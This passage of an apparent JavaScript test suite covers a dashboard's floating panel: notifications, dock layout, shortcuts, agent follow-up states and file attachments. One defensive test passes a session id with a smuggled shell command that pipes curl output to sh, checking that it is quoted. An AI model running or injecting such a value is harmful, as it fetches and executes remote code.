assert.deepEqual(track('active', 105), []); // 2 seconds is not enough
event = track('active', 106)[0];
assert.deepEqual([event.title, event.sub, event.dot, event.delta], ['Triage started', 'Codex', 'on', 1]);
assert.deepEqual(track('active', 107), []); // said once
assert.deepEqual(track('unknown', 500), []); // a lost connection says nothing
assert.deepEqual(track('idle', 501), []);
assert.deepEqual(track('unknown', 900), []);
assert.deepEqual(track('idle', 505), []);
event = track('idle', 510)[0];
assert.deepEqual([event.title, event.dot, event.delta], ['Triage stopped', 'off', -1]);
run('tracked = new Map()');
assert.deepEqual(track('active', 1, false), []); // already running at startup: baseline
run('tracked = new Map()');
assert.deepEqual(track('active', 1), []); // appears running after startup: it just started, and holds first
assert.equal(track('active', 5)[0].title, 'Triage started');

// Usage speaks only at the moment it crosses the line.
const usageAt = (left) => ({codex: {as_of: 1, windows: [{name: 'weekly', left, resets_at: null}]}});
const crossed = (a, b) => JSON.parse(run(`JSON.stringify(usageChanges(${JSON.stringify(a)}, ${JSON.stringify(b)}))`));
event = crossed(usageAt(11), usageAt(10))[0];
assert.deepEqual([event.title, event.sub, event.dot], ['Codex is nearly out', '10% of the weekly limit left', 'bad']);
assert.deepEqual(crossed(usageAt(10), usageAt(9)), []); // already said
assert.deepEqual(crossed(usageAt(50), usageAt(40)), []);
assert.deepEqual(crossed(null, usageAt(5)), []); // first sight is not a change
assert.deepEqual(crossed(usageAt(50), {codex: null}), []);

// A burst becomes one card.
const merged = (events) => JSON.parse(run(`JSON.stringify(coalesce(${JSON.stringify(events)}))`));
const one = {group: 'items', metric: 'needs', delta: 1, plural: 'new items', title: 'Only one', sub: 'New action · Harbor', item: 'i'};
assert.equal(merged([one]).title, 'Only one');
assert.equal(merged([one]).item, 'i'); // a single card opens its item
let burst = merged([one, one, {group: 'agents', metric: 'agents', delta: 1, plural: 'agents started'}]);
assert.equal(burst.title, '3 updates');
assert.equal(burst.sub, '2 new items · 1 agent started');
assert.equal(burst.delta, 2);
assert.equal(burst.item, undefined); // several things: it opens the list
assert.equal(merged([one, {...one, delta: -1, plural: 'items cleared'}]).sub, '1 new item · 1 item cleared');
assert.equal(merged([{...one, plural: 'failed replies'}, one]).sub, '1 failed reply · 1 new item');

// The curve is a real spring: it starts at rest, overshoots and settles.
const curve = run("springCurve({stiffness: 190, damping: 17})");
const points = curve.slice(7, -1).split(', ').map(Number);
assert.equal(points[0], 0);
assert.equal(points.at(-1), 1);
assert.ok(Math.max(...points) > 1.05 && Math.max(...points) < 1.3);

// The open box sits beside the pill, which stays put so answered items can fly home to it.
const js = (code) => JSON.parse(run(`JSON.stringify(${code})`));
const capsule = {width: 38, height: 102}, card = {width: 308, height: 62}, listBox = {width: 380, height: 520};
const restAt = (dock, size = capsule) => rect(dock, size);
const boxAt = (dock, size = listBox) => js(`boxRect('${dock}', ${JSON.stringify(restAt(dock, ['top', 'bottom'].includes(dock) ? {width: 102, height: 38} : capsule))}, ${JSON.stringify(size)}, ${JSON.stringify(area)})`);
assert.deepEqual(boxAt('top-left'), {x: 56, y: 35, width: 380, height: 520}); // right of the pill, tops aligned
assert.deepEqual(boxAt('top-right'), {x: 1004, y: 35, width: 380, height: 520}); // left of it
assert.deepEqual(boxAt('bottom-left'), {x: 56, y: 301, width: 380, height: 520}); // bottoms aligned
assert.equal(boxAt('left').y + 260, restAt('left').y + 51); // centered on a side pill
assert.deepEqual(boxAt('bottom'), {x: 530, y: 255, width: 380, height: 520}); // above a pill along the bottom
assert.deepEqual(boxAt('top'), {x: 530, y: 81, width: 380, height: 520}); // below one along the top
assert.deepEqual(boxAt('top-left', {width: 480, height: 5000}), {x: 56, y: 35, width: 480, height: 786}); // never off the screen
// The window is the whole display whatever the dock, so a drop never moves or resizes it:
// the pill, its card and every box are drawn in it at their display positions.
const inside = (outer, inner) => inner.x >= outer.x && inner.y >= outer.y && inner.x + inner.width <= outer.x + outer.width && inner.y + inner.height <= outer.y + outer.height;
const screenAt = {x: 0, y: 0, width: 1440, height: 825}, room = js(`roomOf(${JSON.stringify(screenAt)})`);
assert.deepEqual(room, {x: 0, y: 0, width: 1440, height: 825});
for (const dock of ['top-left', 'top', 'top-right', 'left', 'right', 'bottom-left', 'bottom', 'bottom-right']) {
  const lying = ['top', 'bottom'].includes(dock), rest = restAt(dock, lying ? {width: 102, height: 38} : capsule);
  assert.ok(inside(room, rest), `${dock}: the pill`);
  assert.deepEqual(js(`localRect(${JSON.stringify(rest)}, roomOf(${JSON.stringify(screenAt)}))`), rest, `${dock}: drawn where it is on screen`);
  assert.ok(inside(room, rect(dock, card)), `${dock}: the notification card`);
  for (const size of [listBox, {width: 480, height: 300}, {width: 480, height: 760}, {width: 380, height: 840}]) {
    assert.ok(inside(room, js(`boxRect('${dock}', ${JSON.stringify(rest)}, ${JSON.stringify(size)}, ${JSON.stringify(area)})`)), `${dock}: a ${size.width}x${size.height} box`);
  }
  // Where the ghost lands is where the pill is drawn, in the shape that dock gives it.
  const ghost = js(`dockRects(${JSON.stringify(capsule)}, ${JSON.stringify(area)})['${dock}']`);
  assert.deepEqual(ghost, rest, `${dock}: the ghost lands on the pill`);
}
assert.deepEqual(js('localRect({x: 50, y: 60, width: 5, height: 6}, {x: 40, y: 30})'), {x: 10, y: 30, width: 5, height: 6});

// How the panel moves: Fold springs open and closed, items are a deck, an answer flies home.
const motion = (...args) => run(`motionKind(${args.map((a) => JSON.stringify(a)).join(', ')})`);
assert.equal(motion('pill', 'list', null, null), 'open');
assert.equal(motion('pill', 'item', null, 'a'), 'open'); // a shortcut straight to an item still folds open
assert.equal(motion('item', 'pill', 'a', 'a'), 'close');
assert.equal(motion('list', 'item', null, 'a'), 'deal');
assert.equal(motion('item', 'list', 'a', null), 'gather');
assert.equal(motion('item', 'item', 'a', 'b', ['a', 'b', 'c']), 'next');
assert.equal(motion('item', 'item', 'c', 'b', ['a', 'b', 'c']), 'prev');
assert.equal(motion('item', 'item', 'a', 'b', ['a', 'b'], true), 'answered');
assert.equal(motion('item', 'item', 'gone', 'b', ['b']), 'next'); // the old one left the list
assert.equal(motion('item', 'item', 'a', 'a'), 'none');
assert.equal(motion('list', 'list', null, null), 'none');
assert.equal(motion('list', 'settings', null, null), 'none');

// Spotlight: the label opens away from the edge, and the circle nearest the cursor along the pill wins.
assert.equal(run("spotSide('top-left')"), 'right');
assert.equal(run("spotSide('right')"), 'left');
assert.equal(run("spotSide('bottom')"), 'above');
assert.equal(run("spotSide('top')"), 'below');
const centers = [{x: 19, y: 19}, {x: 19, y: 51}, {x: 19, y: 83}];
assert.equal(run(`nearestCircle(${JSON.stringify(centers)}, 19, 49, true)`), 1);
assert.equal(run(`nearestCircle(${JSON.stringify(centers)}, 300, 90, true)`), 2); // off to the side still picks by height
assert.equal(run(`nearestCircle(${JSON.stringify(centers.map((c) => ({x: c.y, y: c.x})))}, 80, 19, false)`), 2);
assert.equal(run('nearestCircle([], 1, 1, true)'), -1);
// The needs count holds while an answered card is still flying home.
run('flying = 1');
assert.equal(run('METRICS.needs.read([{}, {}]).value'), 3);
assert.equal(run('METRICS.needs.read([{}, {}]).tag'), '3 need you');
run('flying = 0');

// Shortcuts: the same key opens and closes, and what you set survives.
const shortcut = (saved) => JSON.parse(run(`JSON.stringify(cleanShortcuts(${JSON.stringify(saved)}))`));
assert.equal(shortcut().toggle[0].label, '⌃⌥H');
assert.deepEqual(shortcut().customize, []); // nothing bound unless you ask
const mine = {keyCode: 49, modifiers: 2048, label: '⌥Space'};
assert.deepEqual(shortcut({toggle: mine}).toggle, [mine]); // one key from before is a list of one
assert.deepEqual(shortcut({toggle: null}).toggle, []); // cleared stays cleared
assert.equal(shortcut({toggle: {keyCode: 'H'}}).toggle[0].label, '⌃⌥H'); // a broken value falls back
assert.ok(!('gone' in shortcut({gone: mine})));
assert.deepEqual(JSON.parse(run(`JSON.stringify(hotkeyList({toggle: [${JSON.stringify(mine)}], next: []}))`)), [{action: 'toggle', keyCode: 49, modifiers: 2048}]);
assert.equal(new Set(Object.values(shortcut()).flat().map((k) => `${k.keyCode}:${k.modifiers}`)).size, 4); // no two defaults collide
assert.deepEqual(JSON.parse(run('JSON.stringify(cleanNotify({agents: false}))')), {stuck: true, items: true, agents: false, usage: true});
html = run('shortcutsHTML()');
assert.ok(html.includes('Open or minimize the panel') && html.includes('⌃⌥H') && html.includes('data-record="toggle" data-index="0"') && html.includes('>Add</button>'));
run("recording = {action: 'toggle', index: 0}; refused = ['38:6144']");
html = run('shortcutsHTML()');
assert.ok(html.includes('Press keys…') && html.includes('In use by another app'));
run("recording = null; refused = []");
html = run('notifyHTML()');
assert.ok(html.includes('data-notify="agents"') && html.includes('aria-checked="true"'));
assert.ok(run('settingsHTML(attention())').includes('Keyboard shortcuts'));

// Which surface shows, and where you go after acting.
assert.equal(run('surfaceMode(false, null)'), 'pill');
assert.equal(run('surfaceMode(true, null)'), 'list');
assert.equal(run("surfaceMode(true, 'x')"), 'item');
assert.equal(run("afterAct('next', 'n2', true)"), 'n2');
assert.equal(run("afterAct('next', null, true)"), null); // the last one returns to the list
assert.equal(run("afterAct('list', 'n2', true)"), null);
assert.equal(run("afterAct('stay', 'n2', true)"), undefined);
assert.equal(run("afterAct('stay', 'n2', false)"), 'n2'); // done or skipped has nothing left to show

// Every lab axis drives something real, and its starting point is what ships.
const labContext = vm.createContext({});
const labSource = fs.readFileSync('hq/static/float-lab.js', 'utf8');
vm.runInContext(labSource.slice(0, labSource.indexOf('function bootLab()')), labContext);
const lab = (code) => vm.runInContext(code, labContext);
const feelNow = JSON.parse(run('JSON.stringify(feel)'));
assert.deepEqual(JSON.parse(lab('JSON.stringify(defaults())')), feelNow);
for (const axis of JSON.parse(lab('JSON.stringify(AXES)'))) {
  assert.equal(axis.options.filter((o) => o.default).length, 1, axis.id);
  assert.equal(new Set(axis.options.map((o) => o.value)).size, axis.options.length, axis.id);
  assert.ok(axis.options.every((o) => o.label && o.why), axis.id);
}
for (const preset of JSON.parse(lab('JSON.stringify(PRESETS)'))) {
  for (const [key, value] of Object.entries(preset.set)) {
    const axis = JSON.parse(lab('JSON.stringify(AXES)')).find((a) => a.id === key);
    assert.ok(axis?.options.some((o) => o.value === value), `${preset.name}: ${key}`);
  }
}
const picks = lab(`picksText({...defaults(), glide: 180, show: 3}, {glide: 'feels right', layout: '  '}, ' more contrast ')`);
assert.ok(picks.includes('How long does it glide into place? 180 ms (changed). Note: feels right'));
assert.ok(picks.includes('Which way does the pill run? Depends where it sits\n'));
assert.ok(picks.endsWith('Overall: more contrast'));
assert.ok(!picks.includes('how many items')); // sample size is not a decision

// The panel loads style.css too, so the dashboard must never style, on its own, a class the
// pill puts on its circles. A bare .wide once stretched a 3-digit count into a blob.
const dashboardCss = fs.readFileSync('hq/static/style.css', 'utf8');
for (const name of ['wide', 'loud', 'live', 'low', 'none', 'gauge', 'stale', 'dim', 'hot', 'noting', 'instant', 'flying']) {
  assert.ok(!new RegExp(`(^|[\\s,{}>+~(])\\.${name}(?![\\w-])`).test(dashboardCss), `style.css styles .${name}, which the pill also uses`);
}
// The panel's window covers the whole display, so its rows stay narrow without a width query.
const panelCss = fs.readFileSync('hq/static/float.css', 'utf8');
assert.ok(/:where\(html\.float\) \.row \{[^}]*flex-direction: column/.test(panelCss));

// A decision you replied to is not done until its agent hears it and acts.
const day = 86400, follow = (stage, extra = {}) => ({stage, stuck: null, adoptable: false, replied: now - 600, heard: stage === 'acknowledged' ? now - 300 : null, ...extra});
const decided = (fields) => item({status: 'answered', bucket: 'pending', kind: 'question', answer: 'Annual', delivery: 'sent', session_id: 'claude:r', ...fields});
context.queue = {instance: 'server-follow', revision: 1, sessions: [
  {id: 'claude:r', name: 'Pricing chat', provider: 'claude-code', external_id: 'abc-123', cwd: "/Users/someone/it's here", activity: {state: 'offline'}},
  {id: 'codex:r', name: 'Codex chat', provider: 'codex', external_id: 'thread-9', cwd: '/x', activity: {state: 'idle'}},
  {id: 'other:r', name: 'Desktop chat', provider: 'claude-desktop', activity: {state: 'unknown'}}], items: [
  decided({id: 'f1', title: 'Pick the plan', followup: follow('delivering')}),
  decided({id: 'f2', title: 'Pick the name', delivery: 'received', followup: follow('acknowledged')}),
  decided({id: 'f3', title: 'Stopped one', project: 'hq', project_name: 'HQ', followup: follow('delivering', {stuck: 'stopped', replied: now - 2 * day})}),
  decided({id: 'f4', title: 'Unheard one', session_id: 'codex:r', followup: follow('delivering', {stuck: 'unheard', replied: now - 3 * day})}),
  decided({id: 'f5', title: 'Unclosed one', session_id: 'other:r', delivery: 'received', followup: follow('acknowledged', {stuck: 'unclosed', replied: now - 9 * day, heard: now - 8 * day})}),
  decided({id: 'f6', title: 'Skipped one', skipped: true, settle: 'skip', answer: 'Skipped: Dhruv decided not to do this.', followup: follow('delivering')}),
  decided({id: 'f7', title: 'Handed off', handoff: true, followup: follow('delivering', {adoptable: true})}),
  decided({id: 'f8', title: 'Adopted', adopted_from: {session_id: 'claude:old', name: 'Old <chat>', at: now - 60}, delivery: 'received', followup: follow('acknowledged')}),
  item({id: 'f9', title: 'Closed by me', status: 'done', bucket: 'done', answer: 'Annual', delivery: 'withdrawn', closed_by: 'you', agent_note: 'Did it by hand'}),
  decided({id: 'f10', title: 'Marked done', settle: 'done', answer: 'Done: The user marked this done.', followup: follow('delivering')}),
]};
run('applyState(queue); model = derive()');
const decidedPane = (id) => run(`detailHTML(model.items.find((i) => i.id === '${id}'))`);
// Nothing reads a skip, a done or an answer as finished: they wait with the agent.
for (const id of ['f1', 'f6', 'f10']) assert.equal(run(`model.items.find((i) => i.id === '${id}').lane`), 'agents', id);
assert.ok(!run('attention().map((i) => i.id)').includes('f6')); // nor do they need you again
html = decidedPane('f1');
assert.ok(html.includes('<li class="done"><span class="mark">') && html.includes('You decided') && html.includes('<li class="now"><span class="mark"></span><span class="h-label">Agent heard'));
assert.ok(html.includes('Waiting for the agent to hear it') && html.includes('data-close-self>Close it myself') && html.includes('data-handoff>Give to another agent'));
assert.ok(html.includes("cd &#39;/Users/someone/it&#39;\\&#39;&#39;s here&#39; &amp;&amp; claude --resume abc-123")); // quoted for the shell
assert.ok(!html.includes('data-done')); // Mark done is gone; Close it myself takes its place
assert.ok(decidedPane('f2').includes('The agent has it, not closed yet') && decidedPane('f2').includes('<li class="done"><span class="mark"><svg'));
assert.ok(decidedPane('f3').includes('<p class="d-follow stuck">The agent stopped before acting on it</p>'));
assert.ok(decidedPane('f4').includes('Not heard in 3 days') && decidedPane('f4').includes('codex resume thread-9'));
assert.ok(decidedPane('f5').includes('Heard 8 days ago, never closed') && !decidedPane('f5').includes('Resume the conversation')); // no command we can vouch for
assert.ok(decidedPane('f6').includes('<strong>You skipped this</strong></span>') && decidedPane('f6').includes('You skipped it'));
assert.ok(decidedPane('f10').includes('You marked it done') && !decidedPane('f10').includes('Done: The user'));
assert.ok(decidedPane('f7').includes('Offered to the next agent in NoClick') && !decidedPane('f7').includes('data-handoff'));
assert.ok(decidedPane('f8').includes('Taken over from Old &lt;chat&gt;'));
html = decidedPane('f9');
assert.ok(html.includes('Withdrawn: you closed it') && !html.includes('class="decided"'));
run("setDraft('f9', {tab: 'context'})");
assert.ok(decidedPane('f9').includes('Your note') && !decidedPane('f9').includes('From the agent'));
run("openMove = 'close'");
html = decidedPane('f1');
assert.ok(html.includes('id="close-form"') && html.includes('data-optional') && html.includes('placeholder="Close it myself, with a note for the record (optional)"'));
run('openMove = null');
// Rows say where a decision stands.
assert.equal(run("followupShort(model.items.find((i) => i.id === 'f6'))"), 'Skipped · Not heard yet');
assert.equal(run("followupShort(model.items.find((i) => i.id === 'f2'))"), 'Agent has it');
assert.equal(run("followupShort(model.items.find((i) => i.id === 'f3'))"), 'Not acted on');
assert.ok(run("metaHTML(model.items.find((i) => i.id === 'f3'))").includes('<span class="overdue">Not acted on</span>'));
assert.equal(run("dayWords(86400 + 5)"), 'a day');
assert.equal(run("resumeCommand({provider: 'claude-code', external_id: 'u1'})"), 'claude --resume u1');
assert.equal(run("resumeCommand({provider: 'claude-desktop', external_id: 'u1'})"), '');
// An id an agent planted with shell in it is quoted, never run.
assert.equal(run(`resumeCommand({provider: 'claude-code', external_id: "1111 ; curl x|sh #"})`), `claude --resume '1111 ; curl x|sh #'`);
assert.equal(run(`resumeCommand({provider: 'codex', external_id: "a'b"})`), `codex resume 'a'\\''b'`);
// Not acted on: every stuck decision, oldest first, by project.
assert.deepEqual(Array.from(run('stuckItems().map((i) => i.id)')), ['f5', 'f4', 'f3']);
run("route = parseRoute('#/stuck')");
assert.equal(run('route.page'), 'stuck');
assert.equal(run("href({page: 'stuck'})"), '#/stuck');
const stuckPageHTML = run('stuckPage().body');
assert.ok(stuckPageHTML.indexOf('NoClick') < stuckPageHTML.indexOf('>HQ<') && stuckPageHTML.includes('Heard 8 days ago, never closed'));
assert.ok(run('sidebarHTML()').includes('Not acted on</span><span class="sb-count stuck">3</span>'));
run("route = parseRoute('#/')");
// The panel: a quiet line under Needs you opens the same list.
html = run('floatListHTML(attention(), true)');
assert.ok(html.includes('data-view="stuck">3 decisions not acted on</button>'));
assert.ok(run('stuckPanelHTML(true)').includes('data-item="f5"') && run('stuckPanelHTML(true)').includes('data-view="needs"'));
// The pill can show it, off by default, and says when a decision turns stuck.
assert.ok(!run('DEFAULT_CIRCLES').includes('stuck'));
assert.equal(run('METRICS.stuck.read([]).value'), 3);
assert.ok(run('settingsHTML(attention())').includes('data-circle="stuck"'));
const turned = JSON.parse(run("JSON.stringify(stuckChanges([model.items.find((i) => i.id === 'f5')], stuckItems()))"));
assert.deepEqual(turned.map((e) => [e.item, e.group, e.title]), [['f4', 'stuck', 'Not heard in a day: Unheard one'], ['f3', 'stuck', 'An agent stopped before acting on: Stopped one']]);
assert.equal(run("cleanNotify({}).stuck"), true);
assert.ok(run("describeRemoved({title: 'x', project_name: 'P'}, model.items.find((i) => i.id === 'f6'))").sub.startsWith('Skipped'));
// Skip and Mark done say they still have to reach the agent.
assert.ok(source.includes("'Skipped · tells the agent'") && source.includes("'Marked done · tells the agent'") && source.includes('items/${id}/done'));

// Files in a reply: what is taken, when Send is ready, and what the composer shows.
assert.equal(run("fileKind({type: '', name: 'notes.md'})"), 'text/markdown'); // the clipboard often gives no type
assert.equal(run("fileKind({type: 'image/png; charset=binary', name: 'x'})"), 'image/png');
assert.equal(run("fileKind({type: 'application/zip', name: 'a.zip'})"), 'application/zip');
assert.equal(run("fileProblem({type: 'application/zip', name: 'a.zip', size: 10}, 0)"), 'Not a type HQ takes');
assert.equal(run("fileProblem({type: 'image/png', name: 'a.png', size: 26 * 1024 * 1024}, 0)"), 'Too big: 25 MB at most');
assert.equal(run("fileProblem({type: 'image/png', name: 'a.png', size: 0}, 0)"), 'The file is empty');
assert.equal(run("fileProblem({type: 'image/png', name: 'a.png', size: 9}, 10)"), '10 files at most');
assert.equal(run("fileProblem({type: 'text/csv', name: 'a.csv', size: 9}, 2)"), '');
const ready = (text, files) => run(`readyToSend(${JSON.stringify(text)}, ${JSON.stringify(files)})`);
assert.equal(ready('', []), false);
assert.equal(ready('', [{status: 'ready', id: 'a'}]), true); // files alone are a reply
assert.equal(ready('hello', [{status: 'uploading'}]), false); // never while anything uploads
assert.equal(ready('hello', [{status: 'error'}]), true); // a refused file is just left out
const chips = [{key: 'f1', name: 'shot.png', type: 'image/png', size: 2048, status: 'ready', id: 'a1', url: 'blob:x'},
  {key: 'f2', name: 'log.txt', type: 'text/plain', size: 300, status: 'uploading'},
  {key: 'f3', name: 'big.mov', type: 'video/quicktime', size: 9, status: 'error', error: 'Not a type HQ takes'}];
html = run(`composeHTML({id: 'reply', draft: 'text', value: '', placeholder: 'x', label: 'Reply', send: 'Send', ready: readyToSend('', ${JSON.stringify(chips)}), files: ${JSON.stringify(chips)}})`);
assert.ok(html.includes('data-attach="text"') && html.includes('class="composer has-files"') && html.includes('data-attach-pick') && html.includes('type="file" multiple hidden'));
assert.ok(html.includes('<img src="blob:x" alt="shot.png">') && html.includes('data-remove-file="f1"') && html.includes('aria-label="Uploading"'));
assert.ok(html.includes('<span class="c-size">Not a type HQ takes</span>') && html.includes('aria-label="Send" disabled'));
assert.ok(html.indexOf('c-files') < html.indexOf('<textarea') && html.indexOf('c-attach') < html.indexOf('class="send"')); // files above, the clip beside send
assert.ok(!run(`composeHTML({id: 'close-note', draft: 'closeNote', value: '', placeholder: 'x', label: 'Note', send: 'Close', ready: true})`).includes('data-attach'));
// A draft keeps its files across a re-render, in the reply box and in the question box.
context.withFiles = item({id: 'af', kind: 'question', title: 'Pick', options: ['A', 'B'], matters: {lead: 'x', points: []}, needs_you: {lead: 'y', points: []}});
context.queue = {...context.queue, revision: 2, items: [...context.queue.items, context.withFiles]};
run('applyState(queue); model = derive()');
run(`setDraft('af', {files: {text: ${JSON.stringify(chips.slice(0, 2))}, question: [${JSON.stringify(chips[0])}]}, choice: 'A'})`);
html = run("detailHTML(model.items.find((i) => i.id === 'af'))");
assert.ok(html.includes('data-file="f1"') && html.includes('data-file="f2"') && html.includes('data-wide disabled')); // picked, but still uploading
run("setDraft('af', {tab: 'ask'})");
assert.ok(run("detailHTML(model.items.find((i) => i.id === 'af'))").includes('data-attach="question"'));
run("setDraft('af', {files: undefined, choice: undefined, tab: undefined})");
// What you sent shows your words and thumbnails, not the paths the agent reads.
const listing = '\n\nAttached by the user. Open each file to see it:\n- /data/attachments/ab.png (shot.png, image/png, 2 KB)';
assert.equal(run(`withoutFileList(${JSON.stringify('Use this one' + listing)}, [{id: 'ab'}])`), 'Use this one');
assert.equal(run(`withoutFileList('No files here', [])`), 'No files here');
context.sentWith = {...decided({id: 'sw', answer: 'Use this one' + listing, answer_files: [{id: 'ab', name: 'shot.png', type: 'image/png', size: 2048, path: '/data/attachments/ab.png'}], followup: follow('delivering')}), lane: 'agents'};
html = run('sentHTML(sentWith)');
assert.ok(html.includes('<strong>Use this one</strong>') && !html.includes('/data/attachments') && html.includes('<img data-attachment="ab" alt="shot.png">') && html.includes('data-open-file="ab"'));
context.onlyFiles = {...context.sentWith, answer: listing.trim()};
assert.ok(run('sentHTML(onlyFiles)').includes('<strong>Sent a file</strong>'));
const thread = run(`askHTML({status: 'open', comments: [{id: 'q9', author: 'human', state: 'received', text: 'See this' + ${JSON.stringify(listing)}, attachments: [{id: 'ab', name: 'shot.png', type: 'image/png', size: 2048}]}]}, {})`);
assert.ok(thread.includes('<p>See this</p>') && thread.includes('data-attachment="ab"') && !thread.includes('/data/attachments'));

// Each tab of the panel keeps where you were, across closing it and across a restart.
run(`realRender = render; render = () => {}; realDrop = dropNotices; dropNotices = () => {};
  tabState = cleanTabs(null); floatOpen = false; customizing = false; route = parseRoute('#/'); listView = 'needs'; agentOpen = null; cursor = null`);
// An agent's page survives closing and reopening the panel.
run(`openTab('agents'); showList('agents', 'codex:r'); setOpen(false)`);
assert.equal(run('floatOpen'), false);
run('setOpen(true)');
assert.equal(run('listView'), 'agents');
assert.equal(run('agentOpen'), 'codex:r');
// So does an open item, with its tab and draft.
run(`showList('needs'); setRouteItem('af'); setDraft('af', {tab: 'context', text: 'half a reply'}); setOpen(false); setOpen(true)`);
assert.equal(run('route.item'), 'af');
assert.equal(run("draftOf('af').text"), 'half a reply');
assert.equal(run("draftOf('af').tab"), 'context');
// Each tab is its own: switching away and back finds each as it was.
run(`showList('agents')`);
assert.equal(run('route.item'), null);
assert.equal(run('agentOpen'), 'codex:r');
run(`showList('needs')`);
assert.equal(run('route.item'), 'af');
// Something answered while the panel was shut falls back to its list, on the row that took its place.
run(`setOpen(false); tabState.tabs.needs = {...blankTab(), item: 'f1', index: 2, scroll: 120}; tabState.view = 'needs'`);
run('setOpen(true)');
assert.equal(run('route.item'), null);
assert.equal(run('cursor'), 'f1');
assert.equal(run('fallbackIndex'), 2);
// A circle opens its own tab, as it was left; the capsule itself opens the last tab.
assert.equal(run("pillTarget('agents')"), 'agents');
assert.equal(run("pillTarget('needs')"), 'needs');
assert.equal(run("pillTarget('due')"), 'needs');
assert.equal(run("pillTarget('stuck')"), 'stuck');
assert.equal(run("pillTarget('claude')"), 'usage'); // the usage circles open Usage
assert.equal(run("pillTarget(null)"), null);
assert.equal(run("pillTarget('needs', 'agents')"), 'agents'); // a notice about an agent opens Agents
run(`setOpen(false); openTab('agents')`);
assert.equal(run('agentOpen'), 'codex:r');
// What is stored is ids and positions, never what items say.
const stored = run('JSON.stringify(tabState)');
assert.ok(stored.includes('"agent":"codex:r"') && !stored.includes('Pick') && !stored.includes('half a reply'));
// A missing or corrupt entry starts clean rather than failing.
assert.deepEqual(JSON.parse(run('JSON.stringify(cleanTabs(null))')).view, 'needs');
assert.deepEqual(JSON.parse(run("JSON.stringify(cleanTabs('garbage'))")).tabs.agents, JSON.parse(run('JSON.stringify(blankTab())')));
const junk = JSON.parse(run(`JSON.stringify(cleanTabs({view: 'evil', tabs: {needs: {item: 42, cursor: '${'x'.repeat(300)}', scroll: -5, index: 'x', itemTab: 'bad', all: 'yes'}, agents: 'nope'}}))`));
assert.equal(junk.view, 'needs');
assert.deepEqual(junk.tabs.needs, JSON.parse(run('JSON.stringify(blankTab())')));
assert.equal(run("remember('hq-float-tabs')"), null); // no storage here at all, and nothing throws
run('render = realRender; dropNotices = realDrop; floatOpen = false; route = parseRoute("#/"); listView = "needs"; agentOpen = null');

// The pill's size: kept within 22 to 40, whole pixels, and anything odd is Medium.
for (const [given, kept] of [[24, 24], ['34', 34], [27.6, 28], [50, 40], [10, 22], ['abc', 28], [null, 28], [undefined, 28], [true, 28], ['', 28], [{}, 28]]) {
  assert.equal(run(`cleanPillSize(${JSON.stringify(given) ?? 'undefined'})`), kept, `size ${JSON.stringify(given)}`);
}
// Padding and gaps grow with the circles, and every dock still fits the capsule on screen.
assert.deepEqual([24, 28, 34, 40].map((n) => run(`pillPad(${n})`)), [3, 4, 5, 6]);
assert.deepEqual([24, 28, 34, 40].map((n) => run(`pillChrome(${n})`)), [8, 10, 12, 14]);
const free = {x: 0, y: 33, width: 1728, height: 994};
for (const size of [22, 24, 28, 34, 40]) {
  const pad = run(`pillPad(${size})`), chrome = run(`pillChrome(${size})`), long = 4 * size + 3 * pad + chrome, short = size + chrome;
  for (const dock of ['top-left', 'top', 'top-right', 'left', 'right', 'bottom-left', 'bottom', 'bottom-right']) {
    const shape = JSON.parse(run(`JSON.stringify(capsuleSize({width: ${short}, height: ${long}}, layoutFor('${dock}')))`));
    const at = JSON.parse(run(`JSON.stringify(dockRect('${dock}', ${JSON.stringify(shape)}, ${JSON.stringify(free)}))`));
    assert.ok(at.x >= free.x && at.y >= free.y && at.x + at.width <= free.x + free.width && at.y + at.height <= free.y + free.height, `${dock} at ${size}`);
    assert.deepEqual([at.width, at.height], [shape.width, shape.height], `${dock} at ${size} is never squeezed`);
  }
}
// Customize offers the sizes, with the current one chosen, and saves it with the rest.
run('feel.size = 34');
html = run('settingsHTML(attention())');
assert.ok(html.includes('aria-label="Pill size"') && html.includes('data-pill-size="34" aria-checked="true">Large') && html.includes('data-pill-size="24" aria-checked="false">Small'));
run(`posted = []; window = {webkit: {messageHandlers: {hq: {postMessage: (m) => posted.push(m)}}}}; saveSettings(); delete globalThis.window; feel.size = 28`);
assert.equal(run("posted.find((m) => m.type === 'settings').settings.pillSize"), 34);

// Files from the window (Finder drops): base64 becomes a File, and one it refused keeps its reason.
context.fromWindow = [{name: 'shot.png', type: 'image/png', data: Buffer.from([0x89, 0x50, 0x4e, 0x47, 13, 10, 26, 10, 1, 2, 3]).toString('base64')},
  {name: 'movie.mov', error: 'Too big (max 25 MB)'}, {name: 'odd'}];
assert.deepEqual(JSON.parse(run('JSON.stringify(nativeFiles(fromWindow).map((f) => [f.name, f.type, f.size, f.error || null, f instanceof File]))')),
  [['shot.png', 'image/png', 11, null, true], ['movie.mov', '', 0, 'Too big (max 25 MB)', false], ['odd', '', 0, 'Could not read it', false]]);
run(`toasts = []; realToast = toast; toast = (m) => toasts.push(m); realUpload = uploadFile; uploadFile = () => new Promise(() => {});
  setDraft('dq', {files: undefined}); addFiles('dq', 'text', nativeFiles(fromWindow))`);
assert.deepEqual(JSON.parse(run("JSON.stringify(draftOf('dq').files.text.map((f) => [f.name, f.status, f.error || null]))")),
  [['shot.png', 'uploading', null], ['movie.mov', 'error', 'Too big (max 25 MB)'], ['odd', 'error', 'Could not read it']]);
// Dropped where no item can take them, they are not lost silently.
run(`route.item = null; dropped = dropFilesAt(null, nativeFiles(fromWindow))`);
assert.equal(run('dropped'), false);
assert.deepEqual(Array.from(run('toasts')), ['Open an item to attach files']);
run(`toast = realToast; uploadFile = realUpload; setDraft('dq', {files: undefined})`);

// Views + Groups: views with counts, a search inside them, four orders, five groupings, folds
// kept per grouping, Only this, and N of M with Clear.
const gItem = (id, fields) => ({...item({id, title: id, ...fields}), lane: 'you'});
context.gBase = [
  gItem('g1', {title: 'Approve the staging certificate', kind: 'blocker', project: 'lantern', project_name: 'Lantern', session_id: 'codex:a', session_name: 'Deploy watcher', minutes: 1, rank: 20, created: now - 600}),
  gItem('g2', {title: 'Choose the launch date', kind: 'question', project: 'harbor', project_name: 'Harbor', session_id: 'claude:c', session_name: 'Release planner', minutes: 2, rank: 40, created: now - 7200, pinned: true}),
  gItem('g3', {title: 'Check the export totals', kind: 'todo', project: 'harbor', project_name: 'Harbor', session_id: 'codex:a', session_name: 'Deploy watcher', minutes: 6, rank: 250, created: now - 3 * 86400, due: run('today()')}),
  gItem('g4', {title: 'Pick the partner list', kind: 'question', project: 'atlas', project_name: 'Atlas', session_id: 'claude:c', session_name: 'Release planner', minutes: 3, rank: 120, created: now - 86400 * 9}),
